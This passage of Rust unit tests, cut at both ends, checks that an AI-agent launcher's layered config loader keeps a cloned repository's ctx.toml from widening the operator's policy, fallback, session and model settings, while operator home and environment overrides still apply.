    fn the_repo_own_settings_toml_parses_without_error() {
        let repo = Path::new(env!("CARGO_MANIFEST_DIR"));
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let empty: HashMap<String, String> = HashMap::new();
        let gate = crate::settings::AgentGate::load(repo, &|k| empty.get(k).cloned())
            .expect("the repo's own .zirv/.settings.toml must parse cleanly");

        assert!(gate.is_enabled("claude"));
        assert!(gate.is_enabled("codex"));
    }

    #[test]
    fn a_config_with_no_policy_table_declares_no_restriction() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.policy, super::super::policy::EffectivePolicy::default());
    }

    #[test]
    fn the_operator_may_set_policy_stances_from_home_config_and_env() {
        use super::super::policy::Stance;

        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[policy]\nshell_exec = \"ask\"\nnetwork = \"deny\"\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.policy.shell_exec, Stance::Ask);
        assert_eq!(cfg.policy.network, Some(Stance::Deny));
        assert_eq!(cfg.policy.repo_fs_write, Stance::Allow);

        let env = env_map(&[("ZIRV_CTX_POLICY_SHELL_EXEC", "deny")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.policy.shell_exec, Stance::Deny);
        assert_eq!(
            cfg.policy.network,
            Some(Stance::Deny),
            "the home layer still applies under the env layer"
        );
    }

    /// SECURITY: the cloned-repository privilege-widening case, end to end
    /// through `CtxConfig::load` rather than through `policy::resolve` alone.
    /// `[policy]` is the one table a repo checkout may write to at all, so the
    /// clamp is what stands in for a `REPO_FORBIDDEN` entry here -- see the
    /// `policy` field's own doc comment.
    #[test]
    fn a_repo_policy_table_cannot_widen_the_operators_own_stances() {
        use super::super::policy::Stance;

        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[policy]\nshell_exec = \"deny\"\nnetwork = \"deny\"\napproval = \"ask\"\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[policy]\nshell_exec = \"allow\"\nnetwork = \"ask\"\napproval = \"allow\"\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.policy.shell_exec, Stance::Deny);
        assert_eq!(cfg.policy.network, Some(Stance::Deny));
        assert_eq!(cfg.policy.approval, Stance::Ask);
    }

    /// Bug B, end to end: the same cloned-repository widening attempt as
    /// `a_repo_policy_table_cannot_widen_the_operators_own_stances` above, but
    /// followed all the way to the argv `AgentAdapter::policy_args` actually
    /// builds from the resolved (narrow-only) `cfg.policy` -- for *both*
    /// registered adapters, from the *same* resolved config. A repo checkout
    /// must never be able to raise its own approval level on either harness,
    /// and one operator `[policy]` setting must produce a real, non-empty
    /// restriction on both, not just on the one this test happens to check
    /// first.
    #[test]
    fn a_repo_cannot_widen_its_way_to_a_permissive_launch_on_either_adapter() {
        use super::super::adapters::{
            AgentAdapter, LaunchMode, claude::ClaudeAdapter, codex::CodexAdapter,
        };

        let home = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[policy]\nshell_exec = \"deny\"\n",
        )
        .expect("write");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[policy]\nshell_exec = \"allow\"\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");

        let claude = ClaudeAdapter::new(None);
        let claude_args = claude.policy_args(&cfg.policy, LaunchMode::Interactive);
        assert_eq!(
            claude_args,
            claude.read_only_args(),
            "the repo's own 'allow' must not reach claude's launch argv: {claude_args:?}"
        );

        let codex = CodexAdapter::new(None);
        let codex_args = codex.policy_args(&cfg.policy, LaunchMode::Interactive);
        assert!(
            codex_args.contains(&"--sandbox".to_string())
                && codex_args.contains(&"read-only".to_string())
                && codex_args.contains(&"--ask-for-approval".to_string())
                && codex_args.contains(&"never".to_string()),
            "the repo's own 'allow' must not reach codex's launch argv either: {codex_args:?}"
        );
    }

    /// The other direction: narrowing from a checkout is honored, because a
    /// stricter stance can never be a privilege escalation.
    #[test]
    fn a_repo_policy_table_may_narrow_a_stance_the_operator_left_loose() {
        use super::super::policy::Stance;

        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[policy]\ngit_push_destructive = \"deny\"\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.policy.git_push_destructive, Stance::Deny);
    }

    /// The operator's escape hatch above the fold: a repo that narrowed a
    /// stance the operator needs loose is overridable by environment, exactly
    /// like `ZIRV_AGENT_<NAME>_ENABLED` re-enables a repo-disabled agent.
    #[test]
    fn the_environment_can_loosen_a_stance_a_repo_narrowed() {
        use super::super::policy::Stance;

        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[policy]\nshell_exec = \"deny\"\n",
        )
        .expect("write");

        let env = env_map(&[("ZIRV_CTX_POLICY_SHELL_EXEC", "allow")]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert_eq!(cfg.policy.shell_exec, Stance::Allow);
    }

    /// An empty config layer deserializes into the same defaults as
    /// `FallbackConfig::default()` above -- an existing `ctx.toml` written
    /// before issue #358 must keep loading unchanged with every new key
    /// silently defaulted.
    #[test]
    fn fallback_new_keys_default_when_absent_from_every_layer() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("repo");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[fallback]\norder = [\"claude\", \"codex\"]\n",
        )
        .expect("write repo");

        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.fallback, FallbackConfig::default());
    }

    #[test]
    fn a_repo_fallback_table_can_only_narrow_the_operator_policy() {
        let home = tempfile::tempdir().expect("home");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[fallback]\nenabled = true\norder = [\"claude\", \"codex\"]\npredictive_headroom_pct = 15.0\nmin_candidate_headroom_pct = 20.0\nunknown_headroom_pct = 20.0\nsmall_task_max_tokens = 30000\nsmall_task_max_tool_calls = 20\nadaptive_delegation = false\nauto_orchestrator_rollover = false\n",
        )
        .expect("write home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("repo");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        // Every value below except order attempts to make fallback MORE eager.
        // Order also tries to reorder and add a candidate outside the home
        // preference. None of those widenings may survive the trust fold.
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[fallback]\nenabled = true\norder = [\"codex\", \"claude\"]\npredictive_headroom_pct = 80.0\nmin_candidate_headroom_pct = 1.0\nunknown_headroom_pct = 90.0\nsmall_task_max_tokens = 90000\nsmall_task_max_tool_calls = 90\nadaptive_delegation = true\nauto_orchestrator_rollover = true\n",
        )
        .expect("write repo");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(cfg.fallback.enabled);
        assert_eq!(cfg.fallback.order, vec!["claude", "codex"]);
        assert_eq!(cfg.fallback.predictive_headroom_pct, 15.0);
        assert_eq!(cfg.fallback.min_candidate_headroom_pct, 20.0);
        assert_eq!(cfg.fallback.unknown_headroom_pct, 20.0);
        assert_eq!(cfg.fallback.small_task_max_tokens, 30_000);
        assert_eq!(cfg.fallback.small_task_max_tool_calls, 20);
        // Issue #358: a repo cannot flip either switch on for an operator
        // who turned it off, even though both repo values above try to.
        assert!(!cfg.fallback.adaptive_delegation);
        assert_eq!(cfg.fallback.auto_orchestrator_rollover, Some(false));
    }

    #[test]
    fn a_repo_fallback_harness_table_can_only_narrow_per_harness_limits() {
        let home = tempfile::tempdir().expect("home");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[fallback.harness.claude]\nmax_active = 4\nreserve_headroom_pct = 15.0\n",
        )
        .expect("write home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("repo");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            // claude: tries to raise max_active (denied) and lower reserve
            // (denied); codex: a repo-only entry, which simply applies.
            "[fallback.harness.claude]\nmax_active = 9\nreserve_headroom_pct = 5.0\n\n[fallback.harness.codex]\nmax_active = 2\nreserve_headroom_pct = 40.0\n",
        )
        .expect("write repo");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");

        let claude = cfg.fallback.harness_limits("claude");
        assert_eq!(claude.max_active, Some(4));
        assert_eq!(claude.reserve_headroom_pct, Some(15.0));

        let codex = cfg.fallback.harness_limits("CODEX");
        assert_eq!(codex.max_active, Some(2));
        assert_eq!(codex.reserve_headroom_pct, Some(40.0));
        assert_eq!(cfg.fallback.reserve_headroom_pct("codex"), 40.0);
    }

    #[test]
    fn a_repo_harness_entry_may_only_lower_max_active_and_raise_reserve_when_home_already_set_it() {
        let home = tempfile::tempdir().expect("home");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[fallback.harness.codex]\nmax_active = 6\n",
        )
        .expect("write home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("repo");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[fallback.harness.codex]\nmax_active = 2\nreserve_headroom_pct = 50.0\n",
        )
        .expect("write repo");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");

        let codex = cfg.fallback.harness_limits("codex");
        assert_eq!(codex.max_active, Some(2));
        assert_eq!(codex.reserve_headroom_pct, Some(50.0));
        assert_eq!(cfg.fallback.reserve_headroom_pct("codex"), 50.0);
    }

    /// A-2/D-3: a harness entry only the repo layer names was folded through
    /// verbatim (`(None, Some(v)) => Some(v)`), so a repo could set
    /// `reserve_headroom_pct = 0.5` and drop that harness's refusal gate
    /// below the global `min_candidate_headroom_pct` floor -- which the repo
    /// layer may only ever raise. A repo-only entry must still be clamped to
    /// the effective global floor.
    #[test]
    fn a_repo_only_harness_entry_may_not_lower_the_reserve_below_the_global_floor() {
        let home = tempfile::tempdir().expect("home");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(home.path().join(".zirv/ctx.toml"), "").expect("write home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("repo");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[fallback.harness.claude]\nreserve_headroom_pct = 0.5\n",
        )
        .expect("write repo");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");

        assert_eq!(cfg.fallback.min_candidate_headroom_pct, 10.0);
        assert_eq!(cfg.fallback.reserve_headroom_pct("claude"), 10.0);
    }

    #[test]
    fn a_repo_may_disable_filter_and_tighten_fallback() {
        let home = tempfile::tempdir().expect("home");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[fallback]\norder = [\"claude\", \"codex\"]\npredictive_headroom_pct = 20.0\nmin_candidate_headroom_pct = 10.0\nunknown_headroom_pct = 25.0\nsmall_task_max_tokens = 40000\nsmall_task_max_tool_calls = 24\n",
        )
        .expect("write home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("repo");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[fallback]\nenabled = false\norder = [\"codex\"]\npredictive_headroom_pct = 10.0\nmin_candidate_headroom_pct = 30.0\nunknown_headroom_pct = 5.0\nsmall_task_max_tokens = 8000\nsmall_task_max_tool_calls = 6\n",
        )
        .expect("write repo");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(!cfg.fallback.enabled);
        assert_eq!(cfg.fallback.order, vec!["codex"]);
        assert_eq!(cfg.fallback.predictive_headroom_pct, 10.0);
        assert_eq!(cfg.fallback.min_candidate_headroom_pct, 30.0);
        assert_eq!(cfg.fallback.unknown_headroom_pct, 5.0);
        assert_eq!(cfg.fallback.small_task_max_tokens, 8_000);
        assert_eq!(cfg.fallback.small_task_max_tool_calls, 6);
    }

    #[test]
    fn fallback_env_is_the_operator_override_above_repo_narrowing() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("repo");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[fallback]\nenabled = false\norder = []\nunknown_headroom_pct = 0.0\n",
        )
        .expect("write repo");

        let env = env_map(&[
            ("ZIRV_CTX_FALLBACK", "true"),
            ("ZIRV_CTX_FALLBACK_ORDER", "codex,claude"),
            ("ZIRV_CTX_FALLBACK_UNKNOWN_HEADROOM_PCT", "35"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(cfg.fallback.enabled);
        assert_eq!(cfg.fallback.order, vec!["codex", "claude"]);
        assert_eq!(cfg.fallback.unknown_headroom_pct, 35.0);
    }

    /// Issue #358: rolling the orchestrator seat itself is the same class of
    /// decision `handoff.model`/`optimize.model` already gate outright, not
    /// narrowed like `fallback.enabled` -- a repo checkout naming either
    /// rollover-timing key at all is a hard error, mirroring the style of
    /// `a_repo_forbidden_key_is_still_rejected_and_distinguishable_from_a_
    /// parse_failure` above.
    #[test]
    fn a_repo_fallback_rollover_headroom_pct_and_cooldown_are_repo_forbidden() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("repo");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[fallback]\norchestrator_rollover_headroom_pct = 5.0\n",
        )
        .expect("write repo");
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("a repository must not be able to tune rollover headroom");
        assert!(is_repo_forbidden(err.as_ref()), "got: {err}");

        let repo2 = tempfile::tempdir().expect("repo2");
        std::fs::create_dir_all(repo2.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo2.path().join(".zirv/ctx.toml"),
            "[fallback]\nrollover_cooldown_secs = 30\n",
        )
        .expect("write repo2");
        let err = CtxConfig::load(repo2.path(), &|k| empty.get(k).cloned())
            .expect_err("a repository must not be able to tune the rollover cooldown");
        assert!(is_repo_forbidden(err.as_ref()), "got: {err}");
    }

    /// Issue #358: the operator's own `ZIRV_CTX_FALLBACK_*` overrides for the
    /// new keys win over both layers, the same as every existing `fallback.*`
    /// env var already does.
    #[test]
    fn fallback_new_keys_env_is_the_operator_override_above_repo_narrowing() {
        let home = tempfile::tempdir().expect("home");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            home.path().join(".zirv/ctx.toml"),
            "[fallback]\nadaptive_delegation = false\nauto_orchestrator_rollover = false\n",
        )
        .expect("write home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("repo");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");

        let env = env_map(&[
            ("ZIRV_CTX_FALLBACK_ADAPTIVE_DELEGATION", "true"),
            ("ZIRV_CTX_FALLBACK_AUTO_ORCHESTRATOR_ROLLOVER", "true"),
            (
                "ZIRV_CTX_FALLBACK_ORCHESTRATOR_ROLLOVER_HEADROOM_PCT",
                "12.5",
            ),
            ("ZIRV_CTX_FALLBACK_ROLLOVER_COOLDOWN_SECS", "45"),
            ("ZIRV_CTX_FALLBACK_REACTIVE_FORCE_AFTER_SECS", "75"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(cfg.fallback.adaptive_delegation);
        assert_eq!(cfg.fallback.auto_orchestrator_rollover, Some(true));
        assert_eq!(cfg.fallback.orchestrator_rollover_headroom_pct, Some(12.5));
        assert_eq!(cfg.fallback.rollover_cooldown_secs, 45);
        assert_eq!(cfg.fallback.reactive_force_after_secs, 75);
        assert_eq!(cfg.fallback.rollover_headroom_pct(), 12.5);
    }

    /// The operator decision reversing issue #358 (d): with the switch
    /// unset, more than one enabled harness turns automatic orchestrator
    /// rollover ON, a single-harness roster leaves it off, and an explicit
    /// value from any layer still wins.
    #[test]
    fn auto_orchestrator_rollover_defaults_to_the_roster() {
        let mut cfg = CtxConfig::default();
        assert_eq!(cfg.fallback.auto_orchestrator_rollover, None);
        assert_eq!(cfg.fallback.order, vec!["claude", "codex"]);
        assert!(
            cfg.auto_orchestrator_rollover(),
            "two enabled harnesses roll over automatically"
        );

        cfg.fallback.order = vec!["claude".to_string()];
        assert!(
            !cfg.auto_orchestrator_rollover(),
            "a single-harness roster has nowhere to roll over to"
        );

        cfg.fallback.order = vec!["claude".to_string(), "codex".to_string()];
        cfg.fallback.auto_orchestrator_rollover = Some(false);
        assert!(
            !cfg.auto_orchestrator_rollover(),
            "an explicit false still wins"
        );
    }

    /// The repo layer may narrow the switch to `false` even when the
    /// operator never set it, but a repo `true` is a widening and leaves the
    /// roster default in force.
    #[test]
    fn a_repo_may_only_narrow_an_unset_auto_orchestrator_rollover() {
        let home = tempfile::tempdir().expect("home");
        std::fs::create_dir_all(home.path().join(".zirv")).expect("mkdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let empty = env_map(&[]);

        let repo_off = tempfile::tempdir().expect("repo");
        std::fs::create_dir_all(repo_off.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo_off.path().join(".zirv/ctx.toml"),
            "[fallback]\nauto_orchestrator_rollover = false\n",
        )
        .expect("write repo");
        let cfg = CtxConfig::load(repo_off.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(cfg.fallback.auto_orchestrator_rollover, Some(false));
        assert!(!cfg.auto_orchestrator_rollover());

        let repo_on = tempfile::tempdir().expect("repo");
        std::fs::create_dir_all(repo_on.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo_on.path().join(".zirv/ctx.toml"),
            "[fallback]\nauto_orchestrator_rollover = true\n",
        )
        .expect("write repo");
        let cfg = CtxConfig::load(repo_on.path(), &|k| empty.get(k).cloned()).expect("load");
        assert_eq!(
            cfg.fallback.auto_orchestrator_rollover, None,
            "a repo may not widen; the roster default stays in force"
        );
    }

    #[test]
    fn fallback_harness_validation_rejects_unknown_names_and_out_of_range_reserve() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("repo");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[fallback.harness.not-a-real-harness]\nmax_active = 1\n",
        )
        .expect("write repo");
        let empty = env_map(&[]);
        let err = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned())
            .expect_err("an unknown harness name in [fallback.harness] must fail validation");
        assert!(err.to_string().contains("unknown agent"), "got: {err}");

        let repo2 = tempfile::tempdir().expect("repo2");
        std::fs::create_dir_all(repo2.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo2.path().join(".zirv/ctx.toml"),
            "[fallback.harness.codex]\nreserve_headroom_pct = 150.0\n",
        )
        .expect("write repo2");
        let err = CtxConfig::load(repo2.path(), &|k| empty.get(k).cloned())
            .expect_err("an out-of-range reserve_headroom_pct must fail validation");
        assert!(
            err.to_string().contains("must be between 0 and 100"),
            "got: {err}"
        );
    }

    #[test]
    fn a_malformed_repo_policy_table_fails_the_load() {
        let home = tempfile::tempdir().expect("tempdir");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());

        let repo = tempfile::tempdir().expect("tempdir");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[policy]\nshell_exec = \"nope\"\n",
        )
        .expect("write");

        let empty = env_map(&[]);
        assert!(CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).is_err());
    }

    #[test]
    fn fallback_reactive_force_timeout_is_operator_only() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("repo");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        std::fs::write(
            repo.path().join(".zirv/ctx.toml"),
            "[fallback]\nreactive_force_after_secs = 0\n",
        )
        .expect("write repo");
        let err = CtxConfig::load(repo.path(), &|_| None)
            .expect_err("repo cannot force a mid-turn rollover");
        assert!(is_repo_forbidden(err.as_ref()), "{err}");
        assert!(
            err.to_string().contains("reactive_force_after_secs"),
            "{err}"
        );
    }

    /// Issue #352: with nothing configured, the persistent runtime is OFF and
    /// terminal history is OFF. Pinned as a test rather than left to
    /// `#[derive(Default)]` so turning either default around is a visible
    /// change to an assertion about operator safety, not a one-character edit.
    #[test]
    fn the_persistent_runtime_and_its_history_are_both_off_by_default() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("repo");
        let empty = env_map(&[]);
        let cfg = CtxConfig::load(repo.path(), &|k| empty.get(k).cloned()).expect("load");
        assert!(
            !cfg.session.persistent,
            "the experimental runtime must be opt-in"
        );
        assert!(
            !cfg.session.history,
            "terminal history writes secrets to disk and must be opt-in"
        );
        assert_eq!(
            cfg.session.scrollback_rows_or_default(),
            SessionConfig::DEFAULT_SCROLLBACK_ROWS
        );
        assert_eq!(
            cfg.session.stale_after_secs_or_default(),
            SessionConfig::DEFAULT_STALE_AFTER_SECS
        );
    }

    /// Issue #352: every `[session]` key is operator-only, one assertion per
    /// key so a future edit that drops one entry from `REPO_FORBIDDEN` fails
    /// here naming it. `persistent` and `history` are the two that matter
    /// most -- a checkout must not be able to decide that sessions outlive
    /// the operator's terminal, nor that rendered terminal output (tokens
    /// included) is written to disk.
    #[test]
    fn every_session_key_is_operator_only() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        for (key, line) in [
            ("persistent", "persistent = true"),
            ("history", "history = true"),
            ("scrollback_rows", "scrollback_rows = 100000"),
            ("stale_after_secs", "stale_after_secs = 99999"),
        ] {
            let repo = tempfile::tempdir().expect("repo");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(
                repo.path().join(".zirv/ctx.toml"),
                format!("[session]\n{line}\n"),
            )
            .expect("write repo");
            let err = CtxConfig::load(repo.path(), &|_| None)
                .err()
                .unwrap_or_else(|| panic!("a repo must not be able to set session.{key}"));
            assert!(
                is_repo_forbidden(err.as_ref()),
                "session.{key} must be a REPO_FORBIDDEN rejection: {err}"
            );
            assert!(
                err.to_string().contains(key),
                "the refusal must name session.{key}: {err}"
            );
        }
    }

    /// The other direction of the same boundary: the operator's own
    /// environment override does set it, so the gate is reachable at all.
    #[test]
    fn the_operator_environment_turns_the_persistent_runtime_on() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("repo");
        let env = env_map(&[
            ("ZIRV_CTX_SESSION_PERSISTENT", "true"),
            ("ZIRV_CTX_SESSION_HISTORY", "1"),
            ("ZIRV_CTX_SESSION_SCROLLBACK_ROWS", "64"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|k| env.get(k).cloned()).expect("load");
        assert!(cfg.session.persistent);
        assert!(cfg.session.history);
        assert_eq!(cfg.session.scrollback_rows_or_default(), 64);
    }

    /// Issue #699 (cost-routing lever): every `[model_tiers.<agent>]` leaf is
    /// operator-only, the same trust asymmetry as `review.*`/`worker.*`/
    /// `handover.*` -- a repo checkout choosing which model a workflow seat
    /// dispatches on is a provider/model switch, never a narrowing. One
    /// assertion per leaf, on both known adapters, so a future edit that
    /// narrows or drops the `REPO_FORBIDDEN` entry fails here naming the
    /// offending config.
    #[test]
    fn model_tiers_keys_are_repo_forbidden() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        for toml in [
            "[model_tiers.claude]\nfast = \"haiku\"\n",
            "[model_tiers.claude]\nstandard = \"sonnet\"\n",
            "[model_tiers.claude]\ndeep = \"opus\"\n",
            "[model_tiers.codex]\nfast = \"gpt-5.6-luna\"\n",
            "[model_tiers.codex]\nstandard = \"gpt-5.6-terra\"\n",
            "[model_tiers.codex]\ndeep = \"gpt-5.6-sol\"\n",
        ] {
            let repo = tempfile::tempdir().expect("repo");
            std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
            std::fs::write(repo.path().join(".zirv/ctx.toml"), toml).expect("write repo");
            let err = CtxConfig::load(repo.path(), &|_| None)
                .err()
                .unwrap_or_else(|| panic!("a repo checkout must not be able to set `{toml}`"));
            assert!(
                is_repo_forbidden(err.as_ref()),
                "`{toml}` must be a REPO_FORBIDDEN rejection: {err}"
            );
            assert!(
                err.to_string().contains("model_tiers"),
                "the refusal must name model_tiers: {err}"
            );
        }
    }

    #[test]
    fn models_table_is_repo_forbidden_but_operator_environment_is_applied() {
        let home = tempfile::tempdir().expect("home");
        let _home = crate::commands::ctx::testenv::HomeGuard::set(home.path());
        let repo = tempfile::tempdir().expect("repo");
        std::fs::create_dir_all(repo.path().join(".zirv")).expect("mkdir");
        for repo_toml in [
            "[models]\ndiscovery = false\n",
            "[models]\navoid = [\"gpt-5.6-sol\"]\n",
            "[models]\nauto_avoid = true\n",
        ] {
            std::fs::write(repo.path().join(".zirv/ctx.toml"), repo_toml).expect("write repo");
            let err = CtxConfig::load(repo.path(), &|_| None).expect_err("repo models must fail");
            assert!(is_repo_forbidden(err.as_ref()), "{err}");
        }

        std::fs::remove_file(repo.path().join(".zirv/ctx.toml")).expect("remove repo config");
        let env = env_map(&[
            ("ZIRV_CTX_MODELS_DISCOVERY", "false"),
            ("ZIRV_CTX_MODELS_PRICE_FETCH", "false"),
            (
                "ZIRV_CTX_MODELS_PIN",
                "anthropic.opus=claude-opus-5-5,openai.sol=gpt-6.1-sol",
            ),
            ("ZIRV_CTX_MODELS_AVOID", "gpt-5.6-sol, claude-opus-5"),
            ("ZIRV_CTX_MODELS_AUTO_AVOID", "true"),
        ]);
        let cfg = CtxConfig::load(repo.path(), &|key| env.get(key).cloned()).expect("load env");
        assert!(!cfg.models.discovery);
        assert!(!cfg.models.price_fetch);
        assert_eq!(cfg.models.avoid, ["gpt-5.6-sol", "claude-opus-5"]);
        assert!(cfg.models.auto_avoid);
        assert_eq!(
            cfg.models.pin.get("anthropic.opus").map(String::as_str),
            Some("claude-opus-5-5")
        );
        assert_eq!(
            cfg.models.pin.get("openai.sol").map(String::as_str),
            Some("gpt-6.1-sol")
        );
    }

    /// The operator's own home layer is unaffected: `[model_tiers.<agent>]`
    /// set there loads cleanly and reaches `CtxConfig.model_tiers`, exactly
    /// the escape hatch `REPO_FORBIDDEN`'s own doc comment promises.
